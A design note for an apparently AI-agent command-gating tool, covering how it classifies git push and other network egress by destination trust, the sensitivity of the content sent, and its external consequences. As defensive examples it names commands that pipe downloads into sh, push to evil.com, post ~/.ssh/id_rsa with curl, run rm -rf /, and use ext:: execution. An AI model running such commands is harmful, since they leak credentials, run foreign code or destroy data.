# Exposure, egress, and consequences the agent can't assess

Status: design note (2026-07-16). Companion to `behavioral-taxonomy-levels.md`,
`…-archetypes.md`, and the v1.4 canonical spec. Captures a reframe of the network/egress story
that came out of using `git push` as a lens. Nothing here is wired yet — it is the reasoning to
build on, recorded before Phase-1 increment 3 (per-item provenance) and the remote fan-out, because
it changes what we record and why.

## 1. The reframe: a fourth harm category

safe-chains has reasoned about three kinds of harm — **confidentiality** (exfil), **integrity**
(mutation/destruction), **availability** — plus **execution** (running foreign code). Working
through `git push` surfaced a fourth that we had been mis-filing as "workflow":

> **Consequences the acting agent cannot assess.**

An autonomous agent running `git push` cannot know the branch is half-baked WIP that will embarrass
the user, that the repo is a client's and the diff leaks strategy, or that a review is mid-flight.
Publishing a package, cutting a release, sending mail, posting to a shared channel — all carry
reputational / relational / commercial consequences that require **social and situational judgment
the agent does not have.**

The earlier mistake was saying "the human *or the agent* will judge appropriateness, so it's out of
scope." That is incoherent: the agent is precisely the actor that *can't* judge it. Punting to a
judge that doesn't exist is not "out of scope" — it's a silent gap.

**And it flips the argument toward the gate, not away from it.** The reason a PreToolUse hook exists
at all is to route to the human the calls the agent shouldn't make alone. An action with irreversible
*external* consequences the agent can't evaluate is the paradigm case for "ask the human" — a
first-class reason to withhold auto-approval, independent of any systems-safety.

## 2. The scope discipline: recognize and route, never judge

This category is a bottomless pit if mishandled — social appropriateness is subjective, unbounded,
and undecidable from a command string. The discipline that keeps it tractable:

- safe-chains does **not judge** whether an action is wise/appropriate/timely. It never decides that
  a push is premature or a release is ill-advised.
- safe-chains **recognizes the class** — "this exposes something to an external audience,
  irreversibly" — and **routes it to the human**. The human decides; the tool ensures a human is
  asked.

Recognizing external exposure is tractable because the **operation carries it**: `git push`,
`npm publish`, `gh release`, `curl -d`/`-F` to a non-origin destination are recognizably
externally-exposing regardless of whether we can judge the specific act. Judging appropriateness is
not tractable, and we don't attempt it. This is the same scope line as `$PATH`/sandbox being the
harness's job — we draw a boundary and hold it — except here the boundary is "recognize the class,
leave the judgment to the human," not "ignore it."

## 3. Egress is two axes, not one

The exfil half of the egress×mutation 2×2 (see `…-archetypes.md`) is itself two independent axes:

1. **Does host data leave?** — `network.payload = sends-host-data`. A `curl` GET (`fetches`) does
   not; a `curl -d @file` / `git push` does.
2. **Is the destination trusted by provenance?** — the new sub-axis (§4). `git push` to a configured
   `origin` and `git push https://evil.com` have *identical* payload/operation facets; only the
   destination-trust differs, and it is the whole game.

And the confidentiality danger is graded by **content**, not by how public the destination is:

- **secret content leaving** — `secret.level = transmits` (credentials out) is the real escalator.
- **non-secret content leaving** — you sending a file you chose to send is *your* call, not a
  safety event.

**`disclosure.audience` is a recorder, not a gate.** The old instinct "`public` → deny" is wrong:
a public repo you set up is a *controlled destination*, and publishing content you committed there is
your intended act — the danger was never "the data is now public." So `disclosure.audience`
(local-process < local-persistent < trusted-remote < shared-remote < public) is kept as the
**blast-radius record**: it (a) *amplifies* content-sensitivity (a secret to three people vs the
whole internet), and (b) is the measurable proxy for the §1 harm category — how far the effect
escapes the user's control and the agent's judgment. Record it always; gate on it carefully and
rarely; never pretend it's precise — we usually cannot tell a public repo from a private one, so it
is assigned coarsely from the operation or worst-cased.

## 4. Destination trust (proposed third egress axis)

What makes `git push` a *safe* egress is that the destination is a **pre-established trust root** —
the remote you configured at clone / `remote add` time, a deliberate prior act — not a target named
at the moment of invocation. Proposed axis (a *trust* ladder; the resolver assigns it, we do not read
`.git/config`):

- **established** — a configured remote (`git push`, `git push origin main`), a session context set
  earlier. Trusted; the safe case.
- **inline-literal** — a destination typed at invocation (`git push https://host …`). Semi-trusted:
  a human/agent produced it, and it could be prompt-injected.
- **inline-dynamic** — a destination from a variable / substitution (`git push $VAR …`). Untrusted →
  worst-case, the same fail-closed reflex used everywhere.

Note the trust chain: "established" is only trustworthy if the config that established it is — which
ties directly to the `.git`-write / `worktree-trusted` question (whoever can rewrite `.git/config`
redirects every push). This is *not* the same as `disclosure.audience` (who ends up seeing it) or
`network.destination` (fixed vs anywhere); it is *who established the target and when*.

**Resolved (2026-07-16) — it is a genuinely new facet, `locus.provenance`.** The two candidates for
decomposition both fail: `network.destination` (na/fixed/arbitrary) measures *breadth* — `git push
origin` and `git push https://evil.com` are **both `fixed`**; and `locus.binding` (na/pinned/ambient)
measures *visibility* with the **opposite polarity** — for `kubectl --context prod`, on-the-CLI is
the *safe* case, but for push, `origin` (a config-reference name) and `https://host` (a literal
target) are **both `pinned`** while the most-trusted bare `git push` is `ambient`. Provenance is
orthogonal to both (the same `established` appears with both `pinned` and `ambient` binding), so it
earns its own axis:

> **`locus.provenance`: `na` < `established` < `literal` < `opaque`** — how the acted-on target was
> designated. `established` = a stable handle from a prior deliberate act (a configured remote, a
> named context, a saved profile); `literal` = spelled inline (a URL typed now — visible but
> injectable); `opaque` = from a variable/substitution (unreviewable → fail-closed).

`network-admin` caps `provenance <= literal` (a human reviewing at that level sees the URL); `opaque`
lifts only at `yolo`. **`ext::<cmd>` stays out of this facet** — it maps to `execution` (the target
is a local command = RCE), which is what keeps "where does data go" from swallowing "does the target
run code". Proof: `a_literal_send_target_is_network_admin_an_opaque_one_is_yolo`.

**Both halves are now wired (2026-07-16):**
- **The destination-aware resolver.** A profiled sub declares `network_destination = true`
  (`commands/vcs/git.toml`, the `push` sub); `registry::sub_destination_token` extracts the send
  target and `resolve::destination_provenance` classifies it onto `locus.provenance` (bare
  name → `established`, URL/scp-path/filesystem-path → `literal`, `$VAR` → `opaque`), with
  `ext::<cmd>` worst-cased as RCE. Generalizes to `scp`/`rsync`/`curl -d`. Proof:
  `git_push_destination_provenance_is_classified`.
- **CLI per-level classification.** `--level {local-admin,network-admin,yolo}` now classifies via
  `Level::admits` (an eval-level context consulted in `bridge::project`), so `git push origin`
  auto-approves at `network-admin` while `git push $REMOTE` / `git push ext::…` deny, and `rm -rf /`
  denies even at `yolo`. The lower band (`paranoid`..`developer`) is byte-for-byte unchanged. Proofs:
  `upper_band_levels_admit_via_the_engine_end_to_end`, `cli_gate::upper_band_level_thresholds_gate_through_the_cli`.

## 5. Worked example — `git push`, split into orthogonal axes

`git push` looks like the scariest 2×2 corner (egress **and** mutation) yet is routine and safe.
Pulling it apart is what produced this note:

- **Systems-safety:** established destination (§4) + only committed content leaves + one ref +
  recoverable → *safe*. Nothing exfil/RCE/destroy about it.
- **Consequence (§1):** exposes work to an external audience the agent cannot assess → a reason for
  human review that has *nothing to do with* systems-safety.

These are **orthogonal**, and conflating them is what made `git push` feel contradictory. Flag-forms
move it along *other* axes independently: `git push <url>` / `$VAR` → destination-trust; `--force` /
`--delete` → mutation·destroy; `--mirror`/`--all` → egress scale + remote-destroy; `-c
core.sshCommand=…` / `ext::<cmd>` / `--receive-pack=` → **execution** (local/remote RCE). So the
"safe point" is `git push [origin] [ref]`, and each flag is an item that must be positively
classified as *not* one of these escapes — exactly the per-item provenance of increment 3.

## 6. Why the dangerous chains don't need taint (recap, verified)

The compositions one worries about are caught **fail-closed on the dangerous primitive**, not by
tracking a value across a chain: `curl … | sh` denies because `sh` executes opaque input; `rm
$NETVAL` worst-cases an unknown operand; `curl -d @~/.ssh/id_rsa` denies on `sends-host-data`; a URL
splicing in a secret dies on the inner secret read. So cross-command taint (HP-10) is *sidestepped*,
not solved — which is why a bare remote read is a plain reader-level fetch (`…-levels.md` §0) and the
danger lives at the individual unsafe segment.

## 7. What this changes

- **Remote writes not auto-approving now has two justifications, not one:** systems (SafeWrite is
  local) **and** consequence (external exposure the agent can't assess). The second explains why even
  a systems-safe `git push` shouldn't blithely auto-approve.
- **`disclosure.audience = public` is demoted from a gate to a record** (§3). **Done (level side):**
  `network-admin` now admits `disclosure.audience <= public` and gates the confidentiality danger on
  *content* — the `secret <= uses-ambient` ceiling already on that clause — so publishing your own
  non-secret content is a network-admin op while secret exfil stays yolo (proof:
  `public_disclosure_is_recorded_not_gated_secret_transmission_is`). The *destination-trust* half
  (§4) is the remaining, resolver-side piece and is deliberately still open (§8).
- **`disclosure.audience` (blast-radius) should be recorded on every externally-exposing capability**,
  even where undecidable-and-worst-cased, because it is the proxy for the §1 category.

## 8. Open (deliberately not decided here)

- Whether "consequences the agent can't assess" is authored as its own **modifier/axis** or expressed
  through existing facets (`disclosure.audience` + `operation = communicate/create-published`).
- ~~Whether **destination-trust** (§4) is a new facet or decomposes into existing ones.~~ **Resolved
  (2026-07-16): a new facet, `locus.provenance` (§4), fully wired — the destination-aware resolver
  assigns it and the CLI per-level threshold makes it observable end to end (§4).**
- Where, if anywhere, external-exposure magnitude *gates* vs merely *records* (the user's stance:
  record it, don't rush to decide on it).
- The precise resolver rules for assigning destination-trust from `origin` / inline / `$VAR`.
